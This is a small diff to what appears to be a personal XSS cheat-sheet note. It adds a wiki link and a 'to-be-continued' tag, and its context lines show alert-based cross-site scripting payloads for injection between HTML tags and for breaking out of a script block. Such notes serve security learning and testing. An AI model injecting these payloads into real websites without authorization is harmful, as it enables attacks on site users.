@@ -1,3 +1,4 @@
+[[XSS]]
 # Between HTML tags
 ```html
 <script>alert(document.domain)</script>
@@ -40,4 +41,4 @@ Payload:
 </script><img src=1 onerror=alert(document.domain)>
 ```
 
-
+#to-be-continued 
